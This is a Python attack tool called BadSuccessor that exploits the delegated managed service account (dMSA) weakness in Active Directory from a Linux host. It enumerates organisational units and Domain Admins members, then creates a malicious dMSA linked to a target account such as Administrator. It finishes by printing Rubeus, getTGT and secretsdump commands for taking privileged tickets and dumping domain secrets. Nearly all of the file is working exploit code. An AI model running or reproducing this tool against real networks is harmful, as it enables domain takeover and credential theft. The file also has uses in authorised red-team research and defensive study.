
#!/usr/bin/env python3
"""
BadSuccessor - dMSA Privilege Escalation Tool (Linux Version)
Author: Based on research by Yuval Gordon (Akamai)
Description: Tool to exploit dMSA vulnerability for privilege escalation in Active Directory
Platform: Linux (non-domain joined)
Warning: For authorized penetration testing only
"""

import argparse
import sys
import subprocess
import json
import socket
import struct
import base64
import hashlib
import hmac
import time
from datetime import datetime
import re
import os
import binascii
from urllib.parse import quote

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, MODIFY_ADD, SASL, KERBEROS
    from ldap3.core.exceptions import LDAPException
except ImportError:
    print("Error: ldap3 library required. Install with: pip3 install ldap3")
    sys.exit(1)

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket import version
    from impacket.dcerpc.v5 import transport, epm
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGS
except ImportError:
    print("Error: impacket library required. Install with: pip3 install impacket")
    sys.exit(1)

try:
    import gssapi
    GSSAPI_AVAILABLE = True
except ImportError:
    GSSAPI_AVAILABLE = False

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class BadSuccessor:
    def __init__(self):
        self.banner = f"""
{Colors.RED}{Colors.BOLD}
██████╗  █████╗ ██████╗ ███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗ ██████╗ ██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
██████╔╝███████║██║  ██║███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗██║   ██║██████╔╝
██╔══██╗██╔══██║██║  ██║╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
██████╔╝██║  ██║██████╔╝███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
{Colors.END}
{Colors.CYAN}dMSA Privilege Escalation Tool - Linux Edition{Colors.END}
{Colors.YELLOW}Warning: For authorized penetration testing only!{Colors.END}
"""
        self.dc_ip = None
        self.domain = None
        self.username = None
        self.password = None
        self.connection = None
        self.domain_dn = None

    def print_banner(self):
        print(self.banner)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CRITICAL": Colors.PURPLE
        }
        color = colors.get(level, Colors.WHITE)
        print(f"[{timestamp}] {color}[{level}]{Colors.END} {message}")

    def discover_domain_controller(self, domain):
        """Discover domain controller via DNS SRV record"""
        try:
            import dns.resolver
            srv_record = f"_ldap._tcp.{domain}"
            answers = dns.resolver.resolve(srv_record, 'SRV')
            for answer in answers:
                dc_hostname = str(answer.target).rstrip('.')
                try:
                    dc_ip = socket.gethostbyname(dc_hostname)
                    self.log(f"Found DC: {dc_hostname} ({dc_ip})", "SUCCESS")
                    return dc_ip, dc_hostname
                except socket.gaierror:
                    continue
        except ImportError:
            self.log("DNS resolution requires dnspython: pip3 install dnspython", "WARNING")
        except Exception as e:
            self.log(f"DNS discovery failed: {e}", "WARNING")

        return None, None

    def get_kerberos_tgt(self, domain, username, password, dc_ip):
        """Get Kerberos TGT using impacket"""
        try:
            self.log("Requesting Kerberos TGT...", "INFO")

            # Create principal
            user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

            # Get TGT
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                user_principal, password, domain,
                compute_lmhash(password), compute_nthash(password),
                None, dc_ip
            )

            self.log("Successfully obtained Kerberos TGT", "SUCCESS")
            return tgt, cipher, sessionKey

        except KerberosError as e:
            self.log(f"Kerberos authentication failed: {e}", "ERROR")
            return None, None, None
        except Exception as e:
            self.log(f"Error getting TGT: {e}", "ERROR")
            return None, None, None

    def establish_ldap_connection(self, dc_ip, domain, username, password, use_ssl=False, port=None):
        """Establish authenticated LDAP connection"""
        try:
            # Determine port based on SSL preference
            if port is None:
                port = 636 if use_ssl else 389

            protocol = "LDAPS" if use_ssl else "LDAP"
            self.log(f"Attempting {protocol} connection to {dc_ip}:{port}", "INFO")

            # Create server with SSL if requested
            if use_ssl:
                import ssl
                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
            else:
                server = Server(dc_ip, port=port, get_info=ALL)

            user_dn = f"{domain}\\{username}"

            conn = Connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)

            if conn.bind():
                self.log(f"{protocol} authentication successful", "SUCCESS")

                # Get domain DN
                domain_parts = domain.split('.')
                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
                self.log(f"Domain DN: {self.domain_dn}", "INFO")

                return conn
            else:
                self.log(f"{protocol} authentication failed", "ERROR")
                return None

        except Exception as e:
            self.log(f"{protocol} connection error: {e}", "ERROR")
            return None

    def establish_kerberos_connection(self, dc_ip, domain, username, password=None, use_ssl=False, port=None, ccache_file=None):
        """Establish LDAP connection using Kerberos authentication"""

        if not GSSAPI_AVAILABLE:
            self.log("GSSAPI not available, install with: pip3 install python-gssapi", "WARNING")
            return None

        try:
            # Determine port
            if port is None:
                port = 636 if use_ssl else 389

            protocol = "LDAPS" if use_ssl else "LDAP"
            self.log(f"Attempting Kerberos {protocol} connection to {dc_ip}:{port}", "INFO")

            # Create server with SSL if requested
            if use_ssl:
                import ssl
                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
            else:
                server = Server(dc_ip, port=port, get_info=ALL)

            # Try different Kerberos authentication methods
            conn = None

            # Method 1: Use ccache file if provided
            if ccache_file and os.path.exists(ccache_file):
                self.log(f"Using Kerberos ccache: {ccache_file}", "INFO")
                os.environ['KRB5CCNAME'] = ccache_file

                try:
                    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
                    if conn.bind():
                        self.log("Kerberos authentication successful (ccache)", "SUCCESS")
                    else:
                        conn = None
                except Exception as e:
                    self.log(f"GSSAPI Kerberos failed: {e}", "WARNING")
                    conn = None

            # Method 2: Get TGT with password and fallback to NTLM
            elif password:
                self.log("Attempting Kerberos authentication with password", "INFO")
                tgt, cipher, sessionKey = self.get_kerberos_tgt(domain, username, password, dc_ip)

                if tgt:
                    self.log("TGT obtained, falling back to NTLM for LDAP", "WARNING")
                    return self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, port)

            # Method 3: Use current Kerberos credentials (if available)
            if not conn:
                try:
                    self.log("Attempting Kerberos with current credentials", "INFO")
                    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
                    if conn.bind():
                        self.log("Kerberos authentication successful (current creds)", "SUCCESS")
                    else:
                        conn = None
                except Exception as e:
                    self.log(f"Current credentials Kerberos failed: {e}", "WARNING")
                    conn = None

            if conn:
                # Get domain DN
                domain_parts = domain.split('.')
                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
                self.log(f"Domain DN: {self.domain_dn}", "INFO")
                return conn
            else:
                self.log("All Kerberos methods failed", "ERROR")
                return None

        except Exception as e:
            self.log(f"Kerberos connection error: {e}", "ERROR")
            return None

    def establish_connection_with_fallback(self, dc_ip, domain, username, password, prefer_ssl=True, custom_port=None):
        """Try LDAPS first, fallback to LDAP if needed"""

        if custom_port:
            # Use custom port without fallback
            use_ssl = custom_port == 636
            return self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, custom_port)

        if prefer_ssl:
            # Try LDAPS first
            self.log("Attempting LDAPS connection (port 636)...", "INFO")
            conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl=True)
            if conn:
                return conn

            self.log("LDAPS failed, falling back to LDAP...", "WARNING")

        # Try standard LDAP
        self.log("Attempting LDAP connection (port 389)...", "INFO")
        conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl=False)
        if conn:
            return conn

        # Try LDAP with StartTLS
        self.log("Attempting LDAP with StartTLS...", "INFO")
        try:
            import ssl
            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
            server = Server(dc_ip, port=389, tls=tls, get_info=ALL)
            user_dn = f"{domain}\\{username}"

            conn = Connection(server, user=user_dn, password=password, authentication=NTLM)
            if conn.bind():
                conn.start_tls()
                self.log("LDAP with StartTLS successful", "SUCCESS")

                # Get domain DN
                domain_parts = domain.split('.')
                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
                self.log(f"Domain DN: {self.domain_dn}", "INFO")

                return conn
        except Exception as e:
            self.log(f"StartTLS failed: {e}", "WARNING")

        return None

    def establish_connection_with_auth_fallback(self, dc_ip, domain, username, password=None, prefer_ssl=True, custom_port=None, auth_method='auto', ccache_file=None):
        """Try different authentication methods with fallback"""

        # Determine authentication preference
        auth_methods = []
        if auth_method == 'kerberos':
            auth_methods = ['kerberos']
        elif auth_method == 'ntlm':
            auth_methods = ['ntlm']
        else:  # auto
            auth_methods = ['kerberos', 'ntlm']

        for method in auth_methods:
            self.log(f"Trying {method.upper()} authentication", "INFO")

            if method == 'kerberos':
                conn = self.establish_kerberos_connection(dc_ip, domain, username, password, prefer_ssl, custom_port, ccache_file)
                if conn:
                    return conn
                self.log("Kerberos authentication failed, trying next method", "WARNING")

            elif method == 'ntlm':
                if custom_port:
                    use_ssl = custom_port == 636
                    conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, custom_port)
                    if conn:
                        return conn
                else:
                    conn = self.establish_connection_with_fallback(dc_ip, domain, username, password, prefer_ssl, custom_port)
                    if conn:
                        return conn
                self.log("NTLM authentication failed", "WARNING")

        return None

    def check_schema_support(self):
        """Check what dMSA-related schema elements are available"""
        self.log("Checking schema support for dMSA features...")

        try:
            # Check for dMSA object classes in schema
            schema_dn = f"CN=Schema,CN=Configuration,{self.domain_dn}"

            # Check for msDS-DelegatedManagedServiceAccount
            dmsa_class_filter = "(cn=msDS-DelegatedManagedServiceAccount)"
            self.connection.search(
                search_base=schema_dn,
                search_filter=dmsa_class_filter,
                attributes=['cn', 'objectClassCategory']
            )

            dmsa_supported = len(self.connection.entries) > 0

            # Check for msDS-GroupManagedServiceAccount (gMSA)
            gmsa_class_filter = "(cn=msDS-GroupManagedServiceAccount)"
            self.connection.search(
                search_base=schema_dn,
                search_filter=gmsa_class_filter,
                attributes=['cn', 'objectClassCategory']
            )

            gmsa_supported = len(self.connection.entries) > 0

            # Check for critical attributes
            attr_checks = [
                'msDS-ManagedAccountPrecededByLink',
                'msDS-DelegatedMSAState',
                'msDS-GroupMSAMembership'
            ]

            supported_attrs = []
            for attr in attr_checks:
                attr_filter = f"(cn={attr})"
                self.connection.search(
                    search_base=schema_dn,
                    search_filter=attr_filter,
                    attributes=['cn']
                )
                if len(self.connection.entries) > 0:
                    supported_attrs.append(attr)

            # Report findings
            if dmsa_supported:
                self.log("✓ Full dMSA support detected (Server 2025)", "SUCCESS")
            elif gmsa_supported:
                self.log("✓ gMSA support detected (Server 2012+)", "SUCCESS")
            else:
                self.log("✗ No managed service account support detected", "WARNING")

            self.log(f"Supported attributes: {supported_attrs}", "INFO")

            return {
                'dmsa_supported': dmsa_supported,
                'gmsa_supported': gmsa_supported,
                'supported_attributes': supported_attrs
            }

        except Exception as e:
            self.log(f"Error checking schema: {e}", "WARNING")
            return {
                'dmsa_supported': False,
                'gmsa_supported': False,
                'supported_attributes': []
            }

    def enumerate_ou_permissions(self):
        """Enumerate OUs where current user might have create permissions"""
        self.log("Enumerating Organizational Units...")

        try:
            search_filter = "(objectClass=organizationalUnit)"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName', 'name', 'nTSecurityDescriptor']
            )

            writable_ous = []
            for entry in self.connection.entries:
                ou_dn = str(entry.distinguishedName)
                ou_name = str(entry.name)

                # Test write access by attempting to read security descriptor
                if self.test_ou_write_access(ou_dn):
                    writable_ous.append(ou_dn)
                    self.log(f"Potentially writable OU: {ou_name} ({ou_dn})", "SUCCESS")
                else:
                    self.log(f"Found OU: {ou_name}", "INFO")

            return writable_ous

        except Exception as e:
            self.log(f"Error enumerating OUs: {e}", "ERROR")
            return []

    def test_ou_write_access(self, ou_dn):
        """Test if current user has write access to an OU"""
        try:
            # Attempt to read the security descriptor
            self.connection.search(
                search_base=ou_dn,
                search_filter="(objectClass=*)",
                search_scope='BASE',
                attributes=['nTSecurityDescriptor']
            )

            # If we can read the security descriptor, we might have some access
            # This is a simplified check - in a real scenario, you'd parse the ACL
            return len(self.connection.entries) > 0

        except Exception:
            return False

    def create_dmsa_object(self, ou_dn, dmsa_name):
        """Create a dMSA object using LDAP"""
        self.log(f"Creating dMSA object: {dmsa_name} in {ou_dn}")

        try:
            dmsa_dn = f"CN={dmsa_name},{ou_dn}"

            # Try different object class combinations based on schema availability
            object_class_variations = [
                # Full dMSA (Server 2025)
                ['top', 'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'],
                # Fallback to gMSA (Server 2012+)
                ['top', 'msDS-GroupManagedServiceAccount'],
                # Computer object fallback
                ['top', 'person', 'organizationalPerson', 'user', 'computer']
            ]

            for i, object_classes in enumerate(object_class_variations):
                self.log(f"Attempting object creation with classes: {object_classes}", "INFO")

                # Base attributes for all attempts
                base_attributes = {
                    'objectClass': object_classes,
                    'sAMAccountName': f"{dmsa_name}$",
                    'userAccountControl': '4096',  # WORKSTATION_TRUST_ACCOUNT
                }

                # Add dMSA-specific attributes if using dMSA classes
                if 'msDS-DelegatedManagedServiceAccount' in object_classes:
                    base_attributes.update({
                        'msDS-DelegatedMSAState': '0',  # Initial state
                        'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
                        'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"],
                        'msDS-SupportedEncryptionTypes': '28'  # AES256, AES128, RC4
                    })
                elif 'msDS-GroupManagedServiceAccount' in object_classes:
                    base_attributes.update({
                        'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
                        'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"],
                        'msDS-SupportedEncryptionTypes': '28'
                    })
                else:
                    # Computer object attributes
                    base_attributes.update({
                        'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
                        'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"]
                    })

                # Attempt to create the object
                success = self.connection.add(dmsa_dn, attributes=base_attributes)

                if success:
                    self.log(f"Successfully created object with classes: {object_classes}", "SUCCESS")
                    return dmsa_dn, object_classes
                else:
                    self.log(f"Failed with classes {object_classes}: {self.connection.result}", "WARNING")
                    if i < len(object_class_variations) - 1:
                        self.log("Trying next object class variation...", "INFO")

            self.log("All object class variations failed", "ERROR")
            return None, None

        except Exception as e:
            self.log(f"Error creating object: {e}", "ERROR")
            return None, None

    def get_user_dn(self, username):
        """Get the distinguished name of a user"""
        try:
            search_filter = f"(&(objectClass=user)(sAMAccountName={username}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName']
            )

            if self.connection.entries:
                user_dn = str(self.connection.entries[0].distinguishedName)
                self.log(f"Found target user DN: {user_dn}", "SUCCESS")
                return user_dn
            else:
                self.log(f"User not found: {username}", "ERROR")
                return None

        except Exception as e:
            self.log(f"Error finding user: {e}", "ERROR")
            return None

    def simulate_dmsa_migration(self, dmsa_dn, target_user_dn, object_classes):
        """Simulate dMSA migration by setting the critical attributes"""
        self.log(f"Simulating migration to target: {target_user_dn}")

        try:
            changes = {}

            # Set attributes based on object class capabilities
            if 'msDS-DelegatedManagedServiceAccount' in object_classes:
                self.log("Using full dMSA attributes", "INFO")
                changes = {
                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_user_dn])],
                    'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]  # Migration completed
                }
            elif 'msDS-GroupManagedServiceAccount' in object_classes:
                self.log("Using gMSA with custom attributes", "INFO")
                # Try to add the dMSA-specific attributes to existing gMSA
                changes = {
                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_ADD, [target_user_dn])],
                    'msDS-DelegatedMSAState': [(MODIFY_ADD, ['2'])]
                }
            else:
                self.log("Using computer object - adding custom attributes", "WARNING")
                # For computer objects, we'll try to add custom attributes
                changes = {
                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_ADD, [target_user_dn])],
                    'msDS-DelegatedMSAState': [(MODIFY_ADD, ['2'])]
                }

            success = self.connection.modify(dmsa_dn, changes)

            if success:
                self.log("Successfully simulated migration!", "CRITICAL")
                self.log("Object should now reference target user", "CRITICAL")
                return True
            else:
                self.log(f"Failed to modify object: {self.connection.result}", "ERROR")

                # Try alternative approach with individual attribute modifications
                self.log("Trying individual attribute modifications...", "INFO")

                # Try setting predecessor link first
                success1 = self.connection.modify(dmsa_dn, {
                    'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_user_dn])]
                })

                if success1:
                    self.log("Successfully set predecessor link", "SUCCESS")
                else:
                    self.log(f"Failed to set predecessor link: {self.connection.result}", "WARNING")

                # Try setting state
                success2 = self.connection.modify(dmsa_dn, {
                    'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]
                })

                if success2:
                    self.log("Successfully set migration state", "SUCCESS")
                else:
                    self.log(f"Failed to set migration state: {self.connection.result}", "WARNING")

                return success1 or success2

        except Exception as e:
            self.log(f"Error simulating migration: {e}", "ERROR")
            return False

    def verify_dmsa_configuration(self, dmsa_dn):
        """Verify the dMSA configuration"""
        self.log("Verifying dMSA configuration...")

        try:
            self.connection.search(
                search_base=dmsa_dn,
                search_filter="(objectClass=*)",
                search_scope='BASE',
                attributes=['msDS-ManagedAccountPrecededByLink', 'msDS-DelegatedMSAState', 'sAMAccountName']
            )

            if self.connection.entries:
                entry = self.connection.entries[0]
                preceded_by = str(entry['msDS-ManagedAccountPrecededByLink']) if entry['msDS-ManagedAccountPrecededByLink'] else "Not set"
                state = str(entry['msDS-DelegatedMSAState']) if entry['msDS-DelegatedMSAState'] else "Not set"
                sam_name = str(entry['sAMAccountName']) if entry['sAMAccountName'] else "Not set"

                self.log(f"dMSA SAM Account Name: {sam_name}", "INFO")
                self.log(f"Preceded By Link: {preceded_by}", "INFO")
                self.log(f"Migration State: {state}", "INFO")

                if state == "2" and preceded_by != "Not set":
                    self.log("dMSA configuration looks correct for privilege escalation!", "SUCCESS")
                    return True
                else:
                    self.log("dMSA configuration incomplete", "WARNING")
                    return False
            else:
                self.log("Could not retrieve dMSA configuration", "ERROR")
                return False

        except Exception as e:
            self.log(f"Error verifying dMSA: {e}", "ERROR")
            return False

    def enumerate_high_value_targets(self):
        """Enumerate high-value targets for privilege escalation"""
        self.log("Enumerating high-value targets...")

        high_value_groups = [
            "Domain Admins",
            "Enterprise Admins",
            "Schema Admins",
            "Administrators"
        ]

        targets = {}

        for group in high_value_groups:
            try:
                search_filter = f"(&(objectClass=group)(cn={group}))"
                self.connection.search(
                    search_base=self.domain_dn,
                    search_filter=search_filter,
                    attributes=['member']
                )

                if self.connection.entries:
                    group_entry = self.connection.entries[0]
                    members = []

                    if group_entry.member:
                        for member_dn in group_entry.member:
                            # Extract username from DN
                            member_search = f"(distinguishedName={member_dn})"
                            self.connection.search(
                                search_base=self.domain_dn,
                                search_filter=member_search,
                                attributes=['sAMAccountName']
                            )

                            if self.connection.entries:
                                username = str(self.connection.entries[0].sAMAccountName)
                                members.append(username)

                    if members:
                        targets[group] = members
                        self.log(f"{group}:", "INFO")
                        for member in members:
                            self.log(f"  - {member}", "INFO")

            except Exception as e:
                self.log(f"Error enumerating {group}: {e}", "WARNING")

        # Always add built-in Administrator
        targets["Built-in"] = ["Administrator"]
        self.log("Built-in Administrator: Administrator", "INFO")

        return targets

    def cleanup_dmsa(self, dmsa_dn):
        """Clean up the created dMSA"""
        self.log(f"Cleaning up dMSA: {dmsa_dn}")

        try:
            success = self.connection.delete(dmsa_dn)

            if success:
                self.log("Successfully cleaned up dMSA", "SUCCESS")
                return True
            else:
                self.log(f"Failed to clean up dMSA: {self.connection.result}", "WARNING")
                return False

        except Exception as e:
            self.log(f"Error cleaning up dMSA: {e}", "ERROR")
            return False

    def generate_attack_commands(self, dmsa_name, domain):
        """Generate commands for next steps with other tools"""
        self.log("Attack completed! Next steps:", "CRITICAL")
        self.log("", "INFO")
        self.log("1. Request TGT using Rubeus (on Windows machine):", "INFO")
        self.log(f"   Rubeus.exe asktgs /targetuser:{dmsa_name}$ /service:krbtgt/{domain} /dmsa /opsec /nowrap /ptt", "INFO")
        self.log("", "INFO")
        self.log("2. Or use impacket-getTGT (Linux):", "INFO")
        self.log(f"   getTGT.py {domain}/{dmsa_name}$ -dc-ip {self.dc_ip} -no-pass -k", "INFO")
        self.log("", "INFO")
        self.log("3. Use obtained credentials for further attacks:", "INFO")
        self.log(f"   secretsdump.py {domain}/{dmsa_name}$@{self.dc_ip} -just-dc -k", "INFO")
        self.log("", "INFO")
        self.log("Note: The dMSA ticket should contain the target user's privileges in the PAC!", "CRITICAL")

def main():
    parser = argparse.ArgumentParser(
        description="BadSuccessor - dMSA Privilege Escalation Tool (Linux)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic NTLM authentication
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --enumerate

  # Kerberos with password
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 -k --attack --target Administrator

  # Kerberos with ccache
  python3 badsuccessor.py -d domain.com -u user --dc-ip 192.168.1.10 --ccache /tmp/krb5cc_1000 --no-pass --targets

  # NTLM hash authentication
  python3 badsuccessor.py -d domain.com -u user --hash :aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 --dc-ip 192.168.1.10 --enumerate

  # Force LDAPS with Kerberos
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --ldaps --auth kerberos --attack --target Administrator
        """
    )

    # Connection parameters
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., domain.com)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('--dc-ip', help='Domain Controller IP (auto-discover if not specified)')
    parser.add_argument('--ldaps', action='store_true', help='Force LDAPS (SSL) connection on port 636')
    parser.add_argument('--ldap', action='store_true', help='Force LDAP (non-SSL) connection on port 389')
    parser.add_argument('--port', type=int, help='Custom LDAP port (overrides --ldaps/--ldap)')
    parser.add_argument('--no-ssl-fallback', action='store_true', help='Disable automatic LDAPS->LDAP fallback')

    # Authentication options
    parser.add_argument('--auth', choices=['auto', 'kerberos', 'ntlm'], default='auto',
                       help='Authentication method (default: auto)')
    parser.add_argument('--ccache', help='Path to Kerberos ccache file')
    parser.add_argument('--no-pass', action='store_true', help='Use Kerberos authentication without password')
    parser.add_argument('--hash', help='NTLM hash for authentication (format: LM:NT or :NT)')
    parser.add_argument('-k', '--kerberos', action='store_true', help='Use Kerberos authentication (same as --auth kerberos)')

    # Actions
    parser.add_argument('--enumerate', action='store_true', help='Enumerate vulnerable OUs')
    parser.add_argument('--attack', action='store_true', help='Perform the BadSuccessor attack')
    parser.add_argument('--target', help='Target user to escalate to (e.g., Administrator)')
    parser.add_argument('--dmsa-name', default='evil_dmsa', help='Name for the malicious dMSA (default: evil_dmsa)')
    parser.add_argument('--ou-dn', help='Specific OU DN to use (auto-detect if not specified)')
    parser.add_argument('--cleanup', action='store_true', help='Clean up created dMSA')
    parser.add_argument('--dmsa-dn', help='dMSA DN for cleanup')
    parser.add_argument('--targets', action='store_true', help='Enumerate high-value targets')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')

    args = parser.parse_args()

    bs = BadSuccessor()

    if not args.no_banner:
        bs.print_banner()

    # Handle authentication parameters
    if args.kerberos:
        args.auth = 'kerberos'

    if args.no_pass and not args.ccache and not args.hash:
        bs.log("--no-pass requires either --ccache or --hash", "ERROR")
        sys.exit(1)

    if not args.password and not args.no_pass and not args.hash:
        bs.log("Password required unless using --no-pass with --ccache or --hash", "ERROR")
        sys.exit(1)

    # Set up authentication
    auth_password = args.password
    if args.hash:
        # Parse hash format
        if ':' in args.hash:
            lm_hash, nt_hash = args.hash.split(':', 1)
        else:
            lm_hash = 'aad3b435b51404eeaad3b435b51404ee'  # Empty LM hash
            nt_hash = args.hash
        bs.log(f"Using NTLM hash authentication", "INFO")
        # For hash auth, we'd need to implement hash-based authentication
        # For now, fall back to password requirement
        if not args.password:
            bs.log("Hash authentication not fully implemented yet. Use with --password for now.", "WARNING")

    # Store credentials
    bs.domain = args.domain
    bs.username = args.username
    bs.password = auth_password

    # Discover or use provided DC IP
    if args.dc_ip:
        bs.dc_ip = args.dc_ip
    else:
        bs.log("Discovering Domain Controller...", "INFO")
        bs.dc_ip, dc_hostname = bs.discover_domain_controller(args.domain)
        if not bs.dc_ip:
            bs.log("Could not discover DC. Please specify --dc-ip", "ERROR")
            sys.exit(1)

    # Establish LDAP connection with authentication options
    connection_options = {
        'prefer_ssl': not args.ldap,
        'custom_port': args.port,
        'auth_method': args.auth,
        'ccache_file': args.ccache
    }

    # Override SSL preference based on explicit flags
    if args.ldaps:
        connection_options['prefer_ssl'] = True
    elif args.ldap:
        connection_options['prefer_ssl'] = False

    if args.no_ssl_fallback:
        # Use single connection attempt without fallback
        use_ssl = args.ldaps or (args.port == 636)
        port = args.port or (636 if use_ssl else 389)

        if args.auth == 'kerberos':
            bs.connection = bs.establish_kerberos_connection(
                bs.dc_ip, args.domain, args.username, auth_password, use_ssl, port, args.ccache
            )
        else:
            bs.connection = bs.establish_ldap_connection(
                bs.dc_ip, args.domain, args.username, auth_password, use_ssl, port
            )
    else:
        # Use authentication fallback mechanism
        bs.connection = bs.establish_connection_with_auth_fallback(
            bs.dc_ip, args.domain, args.username, auth_password,
            connection_options['prefer_ssl'], connection_options['custom_port'],
            connection_options['auth_method'], connection_options['ccache_file']
        )

    if not bs.connection:
        bs.log("Failed to establish LDAP connection with any authentication method", "ERROR")
        sys.exit(1)

    # Check for Server 2025 DCs and schema support
    schema_info = bs.check_schema_support()

    try:
        # Handle different modes
        if args.targets:
            bs.enumerate_high_value_targets()
            return

        if args.enumerate:
            vulnerable_ous = bs.enumerate_ou_permissions()
            if vulnerable_ous:
                bs.log(f"Found {len(vulnerable_ous)} potentially writable OUs", "SUCCESS")
                for ou in vulnerable_ous:
                    bs.log(f"  - {ou}", "INFO")
            else:
                bs.log("No obviously writable OUs found", "WARNING")
            return

        if args.cleanup:
            if not args.dmsa_dn:
                bs.log("--dmsa-dn parameter required for cleanup", "ERROR")
                return
            bs.cleanup_dmsa(args.dmsa_dn)
            return

        if args.attack:
            if not args.target:
                bs.log("--target parameter required for attack", "ERROR")
                return

            # Find writable OU if not specified
            target_ou_dn = args.ou_dn
            if not target_ou_dn:
                vulnerable_ous = bs.enumerate_ou_permissions()
                if not vulnerable_ous:
                    bs.log("No writable OUs found. Try specifying --ou-dn manually", "ERROR")
                    return
                target_ou_dn = vulnerable_ous[0]
                bs.log(f"Using OU: {target_ou_dn}", "INFO")

            # Perform the attack
            bs.log("Starting BadSuccessor attack...", "CRITICAL")

            # Step 1: Create dMSA
            dmsa_dn, object_classes = bs.create_dmsa_object(target_ou_dn, args.dmsa_name)
            if not dmsa_dn:
                return

            # Step 2: Get target user DN
            target_user_dn = bs.get_user_dn(args.target)
            if not target_user_dn:
                return

            # Step 3: Simulate migration
            if not bs.simulate_dmsa_migration(dmsa_dn, target_user_dn, object_classes):
                return

            # Step 4: Verify configuration
            bs.verify_dmsa_configuration(dmsa_dn)

            # Step 5: Generate next steps
            bs.generate_attack_commands(args.dmsa_name, args.domain)

            bs.log(f"Remember to clean up with: --cleanup --dmsa-dn \"{dmsa_dn}\"", "WARNING")

        else:
            parser.print_help()

    finally:
        # Clean up connection
        if bs.connection:
            bs.connection.unbind()

if __name__ == "__main__":
    main()
